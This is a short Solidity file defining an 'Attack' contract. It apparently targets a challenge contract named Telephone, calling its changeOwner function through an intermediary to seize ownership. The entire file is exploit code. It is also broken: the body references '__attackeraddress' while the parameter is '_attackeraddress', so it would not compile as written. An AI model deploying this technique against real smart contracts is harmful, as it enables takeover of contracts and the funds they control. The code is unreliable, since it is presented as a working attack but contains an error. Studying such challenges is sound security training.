// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Attack {
  Telephone public telephone;

  constructor(address _telephoneaddress) {
    telephone = Telephone(_telephoneaddress);
  }

  function attack(address _attackeraddress) public {
    telephone.changeOwner(__attackeraddress);
  }
}
